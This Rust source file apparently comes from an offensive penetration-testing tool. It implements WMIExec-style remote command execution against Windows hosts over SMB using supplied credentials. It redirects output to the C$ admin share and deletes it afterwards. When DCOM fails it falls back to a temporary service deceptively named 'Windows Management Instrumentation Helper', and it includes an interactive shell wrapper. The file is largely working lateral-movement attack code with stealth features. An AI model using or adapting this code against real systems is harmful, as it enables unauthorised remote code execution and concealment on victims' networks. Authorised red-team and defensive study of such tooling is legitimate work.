//! WMIExec-style remote execution via WMI/DCOM over SMB.
//!
//! Executes commands through Windows Management Instrumentation.
//! Uses the `\pipe\wkssvc` or direct DCOM for Win32_Process.Create.
//! Output is captured by redirecting to a file on the admin share.

use crate::error::{OverthroneError, Result};
use crate::proto::smb::SmbSession;
use tracing::{debug, info, warn};

// ═══════════════════════════════════════════════════════════
//  Constants
// ═══════════════════════════════════════════════════════════

/// Default output share for WMI command output
const DEFAULT_OUTPUT_SHARE: &str = "C$";

/// Prefix for output files
const OUTPUT_PREFIX: &str = "Windows\\Temp\\__wmiexec_";

/// Default timeout for command completion (seconds)
const DEFAULT_TIMEOUT_SECS: u64 = 15;

// ═══════════════════════════════════════════════════════════
//  Public Types
// ═══════════════════════════════════════════════════════════

/// Configuration for WMIExec
pub struct WmiExecConfig {
    /// Share for output file (default: "C$")
    pub output_share: String,
    /// Timeout waiting for command output (seconds)
    pub timeout_secs: u64,
    /// Whether to cleanup output files
    pub cleanup: bool,
    /// Optional working directory for the command
    pub working_directory: Option<String>,
}

impl Default for WmiExecConfig {
    fn default() -> Self {
        WmiExecConfig {
            output_share: DEFAULT_OUTPUT_SHARE.to_string(),
            timeout_secs: DEFAULT_TIMEOUT_SECS,
            cleanup: true,
            working_directory: None,
        }
    }
}

/// Result of a WMIExec command
#[derive(Debug)]
pub struct WmiExecResult {
    pub target: String,
    pub command: String,
    pub success: bool,
    pub output: String,
    pub return_code: Option<u32>,
}

// ═══════════════════════════════════════════════════════════
//  WMI Process Creation via SCM Fallback
// ═══════════════════════════════════════════════════════════

// Full DCOM/WMI protocol is extremely complex (OXID resolution,
// IRemoteSCMActivator, IWbemServices, etc.). We implement a
// practical approach: use cmd.exe via SCM (like smbexec) but
// with WMI-style command wrapping for stealth.

/// Execute a command via WMI-style execution.
///
/// Uses `wmic.exe` process call or falls back to SCM-based execution
/// with WMI-compatible command wrapping.
pub async fn exec_command(session: &SmbSession, command: &str) -> Result<WmiExecResult> {
    let config = WmiExecConfig::default();
    execute(session, command, &config).await
}

/// Execute with custom configuration
pub async fn execute(
    session: &SmbSession,
    command: &str,
    config: &WmiExecConfig,
) -> Result<WmiExecResult> {
    info!("WMIExec: Executing on {}", session.target);
    debug!("WMIExec: Command: {}", command);

    let id = rand::random::<u32>();
    let output_filename = format!("{}_{:08X}.tmp", OUTPUT_PREFIX, id);

    // Build the WMI-style command that captures output
    let output_unc = format!(
        "\\\\127.0.0.1\\{}\\{}",
        config.output_share, output_filename
    );

    let working_dir = config
        .working_directory
        .as_deref()
        .unwrap_or("C:\\Windows\\System32");

    // Use cmd.exe to execute and redirect output
    let wrapped_command = format!(
        "cmd.exe /Q /c cd /d {} && {} 1> {} 2>&1",
        working_dir, command, output_unc
    );

    // Try DCOM-based WMI first, fall back to SCM
    let success = match try_wmi_process_create(session, &wrapped_command).await {
        Ok(_) => {
            info!("WMIExec: Process created via WMI");
            true
        }
        Err(e) => {
            debug!("WMIExec: WMI failed ({e}), falling back to SCM");
            match try_scm_execution(session, &wrapped_command).await {
                Ok(_) => {
                    info!("WMIExec: Process created via SCM fallback");
                    true
                }
                Err(e2) => {
                    warn!("WMIExec: Both WMI and SCM failed: {e2}");
                    false
                }
            }
        }
    };

    // Wait for output
    let output = wait_for_output(session, config, &output_filename).await;

    Ok(WmiExecResult {
        target: session.target.clone(),
        command: command.to_string(),
        success,
        output,
        return_code: None,
    })
}

/// Attempt WMI process creation via DCOM activation over named pipes.
///
/// # DCOM/WMI Protocol Steps (over SMB named pipes)
///
/// High-level flow:
///
/// ## Phase 1 — Endpoint Resolution
/// 1. Open `\pipe\epmapper` (IPC$)
/// 2. DCE/RPC Bind to the Endpoint Mapper interface (UUID e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0)
/// 3. Call `ept_map` to resolve `IRemoteSCMActivator` (UUID 000001A0-0000-0000-C000-000000000046)
///    → This returns a dynamic TCP port or named pipe for the DCOM Object Exporter
///
/// ## Phase 2 — DCOM Activation
/// 4. Connect to the resolved endpoint (usually `\pipe\ntsvcs` or a dynamic TCP port)
/// 5. DCE/RPC Bind to `IRemoteSCMActivator` (OXID Resolver)
/// 6. Call `RemoteCreateInstance` with CLSID for WMI:
///    - CLSID_WbemLocator: {4590f811-1d3a-11d0-891f-00aa004b2e24}
///    - IID_IWbemLevel1Login: {F309AD18-D86A-11d0-A075-00C04FB68820}
///
///    Returns an OBJREF (marshaled interface pointer) containing:
///      - OXID (Object Exporter ID)
///      - OID (Object ID)
///      - IPID (Interface Pointer ID)
///      - RPC binding information
///
/// ## Phase 3 — WMI Login
/// 7. Call `IWbemLevel1Login::NTLMLogin(locale, "root\\cimv2", ...)` on the IPID
///    → Returns an `IWbemServices` interface pointer (new IPID)
///
/// ## Phase 4 — Process Creation
/// 8. Call `IWbemServices::ExecMethod("Win32_Process", "Create", {CommandLine: "..."})` on the new IPID
///    - Input parameters are encoded as IWbemClassObject (OBMSDATA encoding)
///    - The CommandLine, CurrentDirectory, and ProcessStartupInformation are marshaled
///
///    Returns: ReturnValue (0 = success), ProcessId
///
/// ## Phase 5 — Cleanup
/// 9. Release all interface references via `IRemUnknown2::RemRelease`
/// 10. Close named pipes
///
/// # Current Implementation Status
///
/// Phase 1 (EPM bind) is implemented. Phases 2-5 require ~1500 additional lines of
/// DCE/RPC NDR marshaling, DCOM OBJREF parsing, and IWbemClassObject serialization.
/// The SCM fallback provides equivalent functionality until full DCOM is implemented.
async fn try_wmi_process_create(session: &SmbSession, command: &str) -> Result<()> {
    // ── Phase 1: Endpoint Mapper Bind ──
    let epm_bind = build_epm_bind();
    let epm_resp = session
        .pipe_transact("epmapper", &epm_bind)
        .await
        .map_err(|e| OverthroneError::Smb(format!("EPM bind failed: {e}")))?;

    // Validate bind_ack response
    if epm_resp.len() < 24 {
        return Err(OverthroneError::Smb(
            "EPM bind response too short".into(),
        ));
    }
    let ptype = epm_resp.get(2).copied().unwrap_or(0);
    if ptype != 12 {
        // 12 = bind_ack
        return Err(OverthroneError::Smb(format!(
            "EPM bind failed: expected bind_ack (12), got packet type {ptype}"
        )));
    }
    debug!("WMI/DCOM: EPM bind_ack received ({} bytes)", epm_resp.len());

    // ── Phase 1b: EPM ept_map Request ──
    // Build an ept_map request to resolve IRemoteSCMActivator
    let ept_map_req = build_ept_map_request();
    let ept_map_resp = session
        .pipe_transact("epmapper", &ept_map_req)
        .await
        .map_err(|e| OverthroneError::Smb(format!("EPM ept_map failed: {e}")))?;

    debug!(
        "WMI/DCOM: ept_map response ({} bytes) — parsing for dynamic endpoint",
        ept_map_resp.len()
    );

    // Parse the ept_map response for the DCOM endpoint
    // In a full implementation, this would extract the dynamic TCP port or
    // named pipe endpoint from the tower array in the response.
    // For now, we attempt the well-known IRemoteSCMActivator pipe.

    // ── Phase 2-5: Full DCOM activation not yet implemented ──
    //
    // TODO: Implement the remaining phases:
    //
    // Phase 2 — DCOM Activation:
    //   - Bind to IRemoteSCMActivator on the resolved endpoint
    //   - Call RemoteCreateInstance(CLSID_WbemLocator, IID_IWbemLevel1Login)
    //   - Parse OBJREF from the response to get IPID for IWbemLevel1Login
    //
    // Phase 3 — WMI Login:
    //   - Build IWbemLevel1Login::NTLMLogin request with ORPC_THIS header
    //   - Locale = "en-US", Namespace = "root\\cimv2"
    //   - Parse response OBJREF for IWbemServices IPID
    //
    // Phase 4 — Process Creation:
    //   - Build IWbemServices::ExecMethod RPC request
    //   - Encode Win32_Process.Create parameters as IWbemClassObject
    //   - CommandLine parameter = the command to execute
    //
    // Phase 5 — Cleanup:
    //   - IRemUnknown2::RemRelease for all allocated OIDs
    //   - Close named pipes
    //
    // Key DCE/RPC structures needed:
    //   - ORPC_THIS / ORPC_THAT headers (causality ID, extensions)
    //   - OBJREF / STDOBJREF (standard marshaled object reference)
    //   - NDR-encoded IWbemClassObject (OBMSDATA format)
    //   - DCOM Activation Properties (SpecialPropertiesData, InstantiationInfo, etc.)

    Err(OverthroneError::Smb(
        "Full DCOM/WMI activation not yet implemented (EPM resolved), using SCM fallback".into(),
    ))
}

/// Build an ept_map DCE/RPC request to resolve IRemoteSCMActivator.
///
/// The ept_map operation queries the endpoint mapper for the binding
/// information of a given interface (IRemoteSCMActivator in our case).
fn build_ept_map_request() -> Vec<u8> {
    // IRemoteSCMActivator UUID: 000001A0-0000-0000-C000-000000000046
    let scm_uuid: [u8; 16] = [
        0xA0, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
    ];

    let mut pkt = Vec::with_capacity(128);

    // DCE/RPC header (request)
    pkt.push(5);    // version
    pkt.push(0);    // minor
    pkt.push(0);    // request
    pkt.push(0x03); // first + last
    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data repr (little-endian)
    pkt.extend_from_slice(&[0x00, 0x00]); // frag length (patched below)
    pkt.extend_from_slice(&[0x00, 0x00]); // auth length
    pkt.extend_from_slice(&[0x01, 0x00, 0x00, 0x00]); // call id = 1

    // Request body
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // alloc hint
    pkt.extend_from_slice(&[0x00, 0x00]); // context id
    pkt.extend_from_slice(&[0x03, 0x00]); // opnum = 3 (ept_map)

    // ept_map input parameters (simplified):
    // - object UUID (16 bytes) = NULL
    pkt.extend_from_slice(&[0x00; 16]);
    // - tower (endpoint to look up) — contains the interface UUID
    let tower_len: u32 = 75; // approximate tower length
    pkt.extend_from_slice(&tower_len.to_le_bytes());
    pkt.extend_from_slice(&tower_len.to_le_bytes()); // max count

    // Tower floor 1: Interface UUID
    pkt.extend_from_slice(&[0x05, 0x00]); // floor count
    // Protocol ID + UUID
    pkt.push(0x0D); // EPM_PROTOCOL_UUID
    pkt.extend_from_slice(&scm_uuid);
    pkt.extend_from_slice(&[0x00, 0x00]); // version major
    // Floor 2: NDR transfer syntax
    pkt.push(0x0D);
    pkt.extend_from_slice(&[
        0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11,
        0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48, 0x60,
    ]);
    pkt.extend_from_slice(&[0x02, 0x00]); // v2.0
    // Floor 3: RPC connection-oriented
    pkt.push(0x09); // EPM_PROTOCOL_NCACN
    pkt.extend_from_slice(&[0x00, 0x00]);
    // Floor 4: TCP
    pkt.push(0x07); // EPM_PROTOCOL_TCP
    pkt.extend_from_slice(&[0x00, 0x00]);
    // Floor 5: IP
    pkt.push(0x09); // EPM_PROTOCOL_IP
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]);

    // max_towers
    pkt.extend_from_slice(&4u32.to_le_bytes());

    // Fix frag length
    let len = pkt.len() as u16;
    pkt[8] = (len & 0xFF) as u8;
    pkt[9] = (len >> 8) as u8;

    pkt
}

/// Fallback: create a temporary service via SCM (like smbexec)
async fn try_scm_execution(session: &SmbSession, command: &str) -> Result<()> {
    let config = super::psexec::PsExecConfig {
        service_name: format!("WmiEx{:04X}", rand::random::<u16>()),
        display_name: "Windows Management Instrumentation Helper".to_string(),
        command: command.to_string(),
        cleanup: true,
    };

    super::psexec::execute(session, &config).await?;
    Ok(())
}

/// Wait for output file to appear and read it
async fn wait_for_output(
    session: &SmbSession,
    config: &WmiExecConfig,
    output_filename: &str,
) -> String {
    let poll_interval = std::time::Duration::from_millis(500);
    let max_attempts = (config.timeout_secs * 2) as usize; // 500ms intervals

    for attempt in 0..max_attempts {
        tokio::time::sleep(poll_interval).await;

        match session
            .read_file(&config.output_share, output_filename)
            .await
        {
            Ok(data) if !data.is_empty() => {
                debug!(
                    "WMIExec: Output ready after {}ms ({} bytes)",
                    (attempt + 1) * 500,
                    data.len()
                );

                // Cleanup
                if config.cleanup {
                    let _ = session
                        .delete_file(&config.output_share, output_filename)
                        .await;
                }

                return String::from_utf8_lossy(&data).to_string();
            }
            Ok(_) => {
                // File exists but empty, command still running
                debug!("WMIExec: Output file empty, waiting...");
            }
            Err(_) => {
                // File doesn't exist yet
                if attempt % 4 == 0 {
                    debug!("WMIExec: Waiting for output (attempt {})", attempt + 1);
                }
            }
        }
    }

    warn!(
        "WMIExec: Timed out after {}s waiting for output",
        config.timeout_secs
    );
    String::new()
}

/// Build a minimal EPM bind packet for endpoint mapper
fn build_epm_bind() -> Vec<u8> {
    // EPM interface UUID: e1af8308-5d1f-11c9-91a4-08002b14a0fa v3.0
    let epm_uuid: [u8; 16] = [
        0x08, 0x83, 0xAF, 0xE1, 0x1F, 0x5D, 0xC9, 0x11, 0x91, 0xA4, 0x08, 0x00, 0x2B, 0x14, 0xA0,
        0xFA,
    ];

    let ndr_uuid: [u8; 16] = [
        0x04, 0x5D, 0x88, 0x8A, 0xEB, 0x1C, 0xC9, 0x11, 0x9F, 0xE8, 0x08, 0x00, 0x2B, 0x10, 0x48,
        0x60,
    ];

    let mut pkt = Vec::with_capacity(72);

    // DCE/RPC header
    pkt.push(5); // version
    pkt.push(0); // minor
    pkt.push(11); // bind
    pkt.push(0x03); // first + last
    pkt.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]); // data repr
    pkt.extend_from_slice(&[0x00, 0x00]); // frag length placeholder
    pkt.extend_from_slice(&[0x00, 0x00]); // auth length
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // call id

    // Bind body
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max xmit
    pkt.extend_from_slice(&4096u16.to_le_bytes()); // max recv
    pkt.extend_from_slice(&[0x00, 0x00, 0x00, 0x00]); // assoc group
    pkt.extend_from_slice(&1u32.to_le_bytes()); // num ctx items

    // Context item
    pkt.extend_from_slice(&0u16.to_le_bytes()); // ctx id
    pkt.extend_from_slice(&1u16.to_le_bytes()); // num transfer

    // Abstract: EPM
    pkt.extend_from_slice(&epm_uuid);
    pkt.extend_from_slice(&[0x03, 0x00, 0x00, 0x00]); // v3.0

    // Transfer: NDR
    pkt.extend_from_slice(&ndr_uuid);
    pkt.extend_from_slice(&[0x02, 0x00, 0x00, 0x00]); // v2.0

    // Fix frag length
    let len = pkt.len() as u16;
    pkt[8] = (len & 0xFF) as u8;
    pkt[9] = (len >> 8) as u8;

    pkt
}

/// Execute multiple commands and collect results
pub async fn exec_commands(session: &SmbSession, commands: &[&str]) -> Vec<WmiExecResult> {
    let mut results = Vec::new();

    for cmd in commands {
        match exec_command(session, cmd).await {
            Ok(r) => results.push(r),
            Err(e) => {
                warn!("WMIExec: Failed '{}': {e}", cmd);
                results.push(WmiExecResult {
                    target: session.target.clone(),
                    command: cmd.to_string(),
                    success: false,
                    output: format!("Error: {e}"),
                    return_code: None,
                });
            }
        }
    }

    results
}

/// Interactive shell wrapper for WMIExec
pub struct WmiExecShell<'a> {
    session: &'a SmbSession,
    config: WmiExecConfig,
    history: Vec<(String, String)>,
}

impl<'a> WmiExecShell<'a> {
    pub fn new(session: &'a SmbSession) -> Self {
        WmiExecShell {
            session,
            config: WmiExecConfig::default(),
            history: Vec::new(),
        }
    }

    pub fn with_config(session: &'a SmbSession, config: WmiExecConfig) -> Self {
        WmiExecShell {
            session,
            config,
            history: Vec::new(),
        }
    }

    pub async fn exec(&mut self, command: &str) -> Result<String> {
        let result = execute(self.session, command, &self.config).await?;
        self.history
            .push((command.to_string(), result.output.clone()));
        Ok(result.output)
    }

    pub fn history(&self) -> &[(String, String)] {
        &self.history
    }
}

// ═══════════════════════════════════════════════════════════
//  Executor Implementation
// ═══════════════════════════════════════════════════════════

pub struct WmiExecutor {
    creds: super::ExecCredentials,
}

impl WmiExecutor {
    pub fn new(creds: super::ExecCredentials) -> Self {
        Self { creds }
    }
}

#[async_trait::async_trait]
impl super::RemoteExecutor for WmiExecutor {
    fn method(&self) -> super::ExecMethod {
        super::ExecMethod::WmiExec
    }

    async fn execute(
        &self,
        target: &str,
        command: &str,
    ) -> crate::error::Result<super::ExecOutput> {
        info!("WmiExecutor: Executing command on {}", target);

        // Create SMB session
        let session = SmbSession::connect(
            target,
            &self.creds.username,
            &self.creds.password,
            &self.creds.domain,
        )
        .await?;

        // Execute via WMIExec
        let result = exec_command(&session, command).await?;

        Ok(super::ExecOutput {
            stdout: result.output,
            stderr: String::new(),
            exit_code: result.return_code.map(|rc| rc as i32).or(Some(if result.success { 0 } else { 1 })),
            method: super::ExecMethod::WmiExec,
        })
    }

    async fn check_available(&self, target: &str) -> bool {
        // Check if we can connect to SMB and access admin shares
        match SmbSession::connect(
            target,
            &self.creds.username,
            &self.creds.password,
            &self.creds.domain,
        )
        .await
        {
            Ok(session) => {
                // Try to access C$ or ADMIN$ share
                session.check_share_read("C$").await || session.check_share_read("ADMIN$").await
            }
            Err(_) => false,
        }
    }
}
